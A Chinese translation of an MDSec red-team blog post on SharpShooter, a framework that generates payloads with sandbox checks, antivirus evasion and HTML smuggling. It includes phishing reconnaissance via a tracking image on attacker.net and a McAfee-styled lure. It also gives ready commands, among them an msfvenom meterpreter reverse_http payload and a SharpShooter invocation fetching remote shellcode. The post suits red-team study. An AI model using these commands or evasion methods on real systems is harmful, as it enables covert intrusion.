@@ -1,0 +1,214 @@
+# 如何使用SharpShooter生成Payload
+
+阅读量 **162920**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2018-03-09 14:00:43
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章原作者 Admin，文章来源：www.mdsec.co.uk
+
+原文地址：<https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p1.ssl.qhimg.com/t01798925fabd794878.jpg)
+
+## 前言
+
+在模拟攻击中，找到入手点往往是最复杂和最耗费时间的一项工作。通常，我们需要花费较多时间来针对不同操作系统、体系结构、终端检测与响应（EDR）方法、反病毒方案和沙箱解决方案来创建并测试Payload。在许多防护方案中，都越加关注和注意PowerShell，因此我们就不能再一味地坚持PowerShell，而是应该研究并尝试其它技术，以便更好地进入内存，同时避开终端防御。基于上述考虑，我们开发了一款名为SharpShooter的内部Payload生成框架。在测试中，我们发现该框架非常有效，随后我们决定将这一工具公开发布。  
+2017年7月，我们讨论过如何使用James
+Forshaw开发的DotNetToJScript实现以Windows脚本格式执行Shellcode的方法，并发布了CACTUSTORCH工具。该工具实质上是概念验证（PoC），能够高效地进行签名，但我们并不推荐在实际模拟中使用该工具。然而，正是这一概念，为我们今天发布的其中一个工具提供了启发。  
+SharpShooter是武器化的Payload生成框架，支持反沙箱分析、分阶段和无阶段的Payload执行，并能够规避入口监测。SharpShooter提供了一个框架，可以创建以下Windows格式的Payload：
+
+  * HTA
+  * JS
+  * JSE
+  * VBA
+  * VBE
+  * VBS
+  * WSF
+
+创建的Payload可用于检索、编译和执行任意C#源代码。SharpShooter的Payload使用随机密钥进行RC4加密，从而逃避一些反病毒产品的检测。同时，该产品具有集成沙箱检测和环境密钥的功能，以进一步逃避检测。SharpShooter的目标为.NET框架的v2、v3和v4版本，涵盖了大部分Windows工作站的终端用户。  
+除了传统的反病毒软件，SharpShooter已经成功绕过了诸如Palo Alto Traps和Bromium Isolation
+Analysis等产品的“高级终端保护”功能。  
+SharpSHooter绕过Palo Alto Traps以运行一个meterpreter
+Shell的视频请参见：<https://vimeo.com/249569439>  
+在后文中，我们会针对该工具的各种功能进行说明。
+
+## 分阶段和无阶段执行
+
+SharpSHooter支持分阶段（Staged）和无阶段（Shageless）Payload执行。分阶段执行可以使用HTTP(S)或DNS这两种方式进行传输，或者两者同时使用。当分阶段Payload被执行时，会尝试检索已经压缩的C#源代码文件，然后使用所选择的方式进行Base64编码。随后，借助.NET
+CodeDom编译器，将C#源代码下载，并编译到主机上。最后从源代码执行所需的方法。下图展现了SharpShooter在分阶段过程中的具体操作步骤：
+
+  
+分阶段的关键优势在于，它能够在发生故障时更改执行的Payload，并能在成功攻击后隐藏相应植入文件，从而阻碍蓝方（防守方）的调查取证。  
+DNS传递方式需要借助PowerDNS工具实现，我们在此前的文章中曾经详细介绍过（
+<https://www.mdsec.co.uk/2017/07/powershell-dns-delivery-with-powerdns/>
+）。而Web传递方式需要使用-web命令行参数，以特定的URL来执行Web请求。  
+CodeDom是其实现可扩展性的关键所在，多年来我们一直将其用于模拟攻击之中，例如可以规避反病毒检测。但推特账户[@buffaloverflow](https://github.com/buffaloverflow
+"@buffaloverflow")发文指出，该工具最近也在被在野恶意攻击者利用：
+
+  
+使用CodeDom的优势之一在于，它可以灵活地创建Payload，不仅仅能进行ShellCode执行，同时还可以执行任意C#。因此，如果我们想要创建一个可以执行Mimikatz或Process
+Doppelgänging的VBS文件，借助该工具是可以实现的。  
+SharpShooter提供了一个内置的模板，可以用于执行分阶段或无阶段的任意Shellcode。
+
+## 沙箱检测
+
+SharpShooter提供了一些基本的方法，来检测Payload是否在沙箱内执行。除了域密钥技术之外，这些技术都来源于Brandon
+Arvanaghi的CheckPlease项目。  
+如果满足沙箱检测技术中指定的条件，那么Payload将不会执行。具体来说，使用了下面的一些技术：  
+域密钥：Payload只能在特定域上执行；  
+确保加入到域中：仅当工作站加入域时，才会执行Payload；  
+检查沙箱组件：Payload将会搜索文件系统，寻找已知的沙箱技术和虚拟化系统组件，一旦找到，Payload就不会执行；  
+检查错误的MAC地址：Payload将检查系统的MAC地址，如果地址中标识供应商的部分与已知虚拟化软件相匹配，那么就不会执行Payload；  
+检查调试过程：如果Payload正在调试，则不会执行。  
+如果需要使用上述技术创建Payload，请使用-sandbox参数，然后使用逗号来分隔相应的技术，例如：–sandbox 1=CONTOSO,2,3。
+
+## 入口监控的逃避
+
+通常，防御者会通过在周边代理/网关上使用扩展并针对内容类型或具体内容进行过滤的方式，防止潜在的恶意文件进入网络环境。但是，Rich
+Warren记录了一个逃避此类检查的强大解决方案，会对Payload进行加密，并将其嵌入到HTML文件中。随后，Payload在客户端中使用JavaScript进行解密。因此，在监控中就只能看到一个带有text/html内容类型的HTML文件。  
+在SharpShooter中，可以选择使用此技术来嵌入其有效载荷，同时工具还提供了两个样本模板以供参考和使用。在这一方面，SharpShooter参考了[@Arno0x0x](https://github.com/Arno0x0x
+"@Arno0x0x")的EmbedInHTML工具。  
+要创建使用HTML隐藏的Payload，请使用-smuggle和-templete参数来选择模板，例如：–smuggle –template mcafee。
+
+## SharpShooter的示例
+
+当我们的ActiveBreach团队进行攻防模拟时，我们会进行大量的侦察活动。其原因在于，如果我们能全面地掌握目标环境，将会为我们后面的步骤带来大量收益，特别是在创建Payload方面。为了增加SharpShooter在执行Shellcode时的成功几率，我们必须要知道两个目标：目标的架构和目标的.NET版本。幸运的是，这两个信息可以轻松找到。  
+在针对目标进行调查的过程中，我们通常会尽可能多地掌握客户端软件的版本信息，以便在实验室环境内进行复现。为了达到这一目的，一种策略就是通过良性网络钓鱼。具体来说，我们的网络钓鱼电子邮件中并不包含任何特定的Payload，但会将架构信息反馈给我们。其中一种方法是通过外部托管的图像，例如在HTML中可以包含以下内容，这样目标用户的邮件客户端就会对图像进行下载：
+
+    
+    
+    <img src=“http://attacker.net/logo.png?uid=1234” />
+    
+
+以Outlook为例，这样就会导致以下内容的User-Agent被发送到服务器：
+
+    
+    
+    Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/8.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Microsoft Outlook 16.0.6366; ms-office; MSOffice 16)
+    
+
+在上述信息中，包含了一些关键信息，其中最重要的是目标使用了64位操作系统和32位的Microsoft Office，并且安装了.NET CLR。  
+同样，我们也可能会通过社会工程学，让用户访问我们的网站，从而从用户的浏览器中获取到相同的信息，如下面的示例所示，他使用的是Windows 8.1
+x64主机：
+
+    
+    
+    Mozilla/5.0 (Windows NT 6.3; Win64, x64; Touch) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36 Edge/12.0 (Touch; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; HPNTDFJS; H9P; InfoPath
+    
+
+如果我们想要创建一个能执行任意Shellcode的Payload，那么这个信息就特别有用。由于mshta.exe是一个32位二进制文件，所以HTA文件只能使用32位，但除此之外，我们应该始终在64位系统上使用64位的Shellcode。  
+在可能的情况下，我们也要在不违反规则的情况下尽可能多地获得关于内部Active
+Directory的信息。其中，常见的策略包括检查邮件头部中的来源，以发现其完全限定域名（FQDN）。  
+例如，邮件头部中可能会包含类似于如下的内容：
+
+    
+    
+    Received: from EXH004.contoso.com (unknown [10.1.1.1])
+    by smtp.localdomain (Service) with ESMTP id 43BD1114402;
+    Tue, 27 Feb 2018 13:38:33 +0000 (GMT)
+    
+
+通过该内容，我们知道了内部域名是contoso.com。  
+同样，如果我们将目标变为Skype业务服务器，我们可以从X-MS-Server-Fqdn标头中找到域名，如下所示：
+
+    
+    
+    X-MS-Server-Fqdn: S4BLYNC.contoso.com
+    
+
+在掌握了这些信息之后，我们可以开始制作一个SharpShooter的Payload，这个Payload与我们的目标环境有关——除非它在CONTOSO的成员系统上运行，否则就不会执行。  
+如果我们想要创建一个JavaScript的Payload，它将会通过DNS和Web的方式来传递C#
+Payload，我们可能会使用下述类似于命令行选项的内容：
+
+    
+    
+    SharpShooter.py --payload js --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 2
+    
+
+该配置将会使用-sandbox
+1=contoso参数，将我们的Payload锁定到CONTOSO域。目标环境支持3.5及以上版本的.NET，因此我们可以使用-dotnetver
+2参数来指定.NET版本，从而有效提高Payload的成功概率。  
+在上面的例子中，Shellcode是从csharpsc.txt文件中读取的。如果我们想执行符合Cobalt
+Strike的beacon或者Metasploit的Shellcode，可以通过在Cobalt Strike中选择“Packages > Payload
+Generator > Output C#”，或者使用以下msfvnom命令来生成该代码：
+
+    
+    
+    msfvenom -a x64 -p windows/x64/meterpreter/reverse_http LHOST=x.x.x.x LPORT=80 EnableStageEncoding=True PrependMigrate=True -f csharp
+    
+
+在Shellcode文件中应该只包含原始字节，不包括变量定义。例如，byte[] buf = new byte[999] { 0x01, 0x02,
+0x03 …意味着Shellcode文件中只包含0x01、0x02和0x03。  
+上述命令的结果如下所示：
+
+  
+SharpShooter将会在输出目录中创建foo.html、foo.js和foo.payload这三个单独的文件。这些文件的简要说明如下：  
+foo.js是用户最终执行的JavaScript
+Payload。它包含一个Base64编码的RC4加密Blob，会在内存中解密后执行。解密的Payload是包含SharpShooter
+.NET序列化对象的DotNetToJScript代码。如果您使用的是HTML Smuggling，则该文件不需要发送给用户，只是为了提供信息和进行调试。  
+foo.html是HTML文件，我们需要通过各种手段来诱使最终用户打开。该文件包含foo.js的加密副本，该副本需要使用JavaScript解密，然后借助navigator.mssaveBlob技术提供给用户。  
+foo.payload是在目标主机上检索、编译和执行的C#源代码。该文件包含一个用于执行所提供Shellcode的Harness。源代码文件首先被压缩，然后进行Base64编码。根据提供的命令行参数，该文件应该位于URL
+[http://www.foo.bar/shellcode.payload和运行PowerDNS的foo.bar域中。](http://www.foo.bar/shellcode.payload%E5%92%8C%E8%BF%90%E8%A1%8CPowerDNS%E7%9A%84foo.bar%E5%9F%9F%E4%B8%AD%E3%80%82)  
+foo.html文件是我们最终通过电子邮件附件发送给用户的，我们也可以通过钓鱼链接的方式让用户点击。此前，我们选择的是McAfee模板，所以用户将看到类似于如下的内容：
+
+  
+如果用户点击打开JavaScript文件，则Shellcode将会被执行。  
+下面是一个用于检索Cobalt Strike信标的端到端Payload执行视频：<https://vimeo.com/258855822>
+
+## 检测
+
+作为一个优秀的红方成员，我们必须对自己的工具和目标的攻击向量有充分了解。这不仅能帮助我们向蓝队及客户提供更好的建议，还能帮助我们构建出更优秀的工具。  
+在开发SharpShooter的过程中，我们非常希望了解在主机上创建了哪些攻击向量。其中最让我们惊讶的是.NET
+CodeDom的工作方式。在尝试使用该技术的过程中，我们也在研究如何将源代码编译到内存中。这也是我们选择该工具的主要原因之一，因为我们非常希望能在模拟攻击过程中将代码存储在目标主机的内存中。  
+当创建一个新的CodeDom时，需要提供编译参数，其中之一就是布尔型CompilerParameters.GenerateInMemory属性，该属性在SharpShooter中设置为True。然而，我们在监视流程执行的过程中，意识到了我们对该属性产生了错误的理解。实际情况下，在执行WScript.exe或类似的脚本引擎时，它会执行与.NET框架捆绑在一起的csc.exe编译器：
+
+  
+这就意味着，C#源代码被保存到用户磁盘上的Temp文件夹内。随后编译器在命令行中执行，从磁盘文件中读取参数：
+
+  
+因此，保障源代码的签名不被反病毒产品掌握非常关键，当然这只是其中之一。  
+无阶段的Shellcode执行并不会留下这些指标，因为它不是用CodeDom。序列化的.NET对象会直接执行Shellcode。  
+您可以从MDSec ActiveBreach github页面（
+<https://github.com/mdsecactivebreach/SharpShooter> ）下载SharpShooter，本文由Dominic
+Chell撰写。
+
+本文翻译自www.mdsec.co.uk [原文链接](https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **P!chu** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/100533](/post/id/100533)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: [www.mdsec.co.uk](https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/)
+
+如若转载,请注明出处： <https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [powershell](/tag/powershell)
+  * [SharpShooter](/tag/SharpShooter)
+  * [Payload生成框架](/tag/Payload生成框架)
+  * [沙箱检测](/tag/沙箱检测)
+
+ **+1** __0赞
+
+ __收藏
+
+![](https://p3.ssl.qhimg.com/t01bd1dba67fe13cdc6.png) P!chu
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
